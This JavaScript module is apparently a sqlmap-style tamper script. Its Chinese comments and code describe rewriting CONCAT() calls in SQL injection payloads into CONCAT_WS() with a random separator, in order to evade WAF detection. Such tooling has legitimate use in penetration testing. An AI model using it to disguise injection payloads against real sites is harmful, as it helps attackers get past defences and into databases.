// 差异化 CONCAT：将 CONCAT() 替换为 CONCAT_WS() 使用不同分隔符（对标 sqlmap dconcat.py）
// 与 concat2ws 的区别：使用随机分隔符而非固定空串
const SEPARATORS = [',', ' ', '|', '/', ':', ';', '#'];

export const dconcat = {
  name: 'dconcat',
  description: '将 CONCAT() 替换为 CONCAT_WS() 使用随机分隔符，绕过 WAF 检测',
  transform(payload, ctx) {
    const sep = SEPARATORS[Math.floor(Math.random() * SEPARATORS.length)];
    return String(payload ?? '').replace(/CONCAT\s*\(/gi, (match) => {
      const isLower = match[0] === 'c';
      return isLower ? `concat_ws('${sep}',` : `CONCAT_WS('${sep}',`;
    });
  },
};
export default dconcat;